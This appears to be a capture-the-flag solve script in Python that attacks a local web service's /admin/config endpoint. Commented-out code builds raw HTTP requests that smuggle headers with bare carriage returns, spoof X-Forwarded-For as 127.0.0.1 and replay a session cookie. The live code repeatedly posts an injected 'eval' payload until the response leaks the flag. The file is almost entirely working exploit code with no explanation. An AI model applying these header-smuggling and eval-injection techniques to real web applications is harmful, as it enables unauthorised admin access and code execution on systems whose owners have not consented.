from pwn import *

# io = remote("localhost", 8080)

# d = b'{"eval":"set_config("123");get_config();"}'
# # d = b'{"eval":"skbidis"}'

# req = b"\r\n".join([
#     b"POST /admin/config HTTP/1.1\rCookie: SESSIONID=ARzA2SwXje4HZkgox1yeXF3VXv1NvEYDumoDAzN0tHdJ5sXav1K0oixaHLle5yEJ\rX-Forwarded-For:127.0.0.1\raa:",
#     b"aaaa: aaaa"
#     b"Cookie: SESSIONID=ARzA2SwXje4HZkgox1yeXF3VXv1NvEYDumoDAzN0tHdJ5sXav1K0oixaHLle5yEJ;"
#     b"Content-Type: application/json",
#     b"Content-Length: " + str(len(d)).encode(),
#     b"",
#     d
# ])

# io.send(req)
# io.interactive()

# io = remote("localhost", 8080)

# d = b'{"eval":"print(get_config());"}'
# # d = b'{"eval":"skbidis"}'

# req = b"\r\n".join([
#     b"POST /admin/config HTTP/1.1",
#     b"Content-Type: application/json",
#     b"Content-Length: " + str(len(d)).encode(),
#     b"",
#     d
# ])

# io.send(req)
# io.interactive()

import requests
import json

value = ''

for i in range(6):
    value += 'set_config("//////////////////////////////////////////");'

value += '"' + 'flag,'*6 + 'flag"'


for i in range(0x30):
    try:
        r = requests.post("http://localhost:8080/admin/config", json={
            "eval": f"{value}"}
        )
        print(json.loads(r.text)['data'])
        if 'ctf' in json.loads(r.text)['data']:
            exit(0)
    except KeyError:
        print(r.text)
    except requests.exceptions.ConnectionError:
        print("Noo")
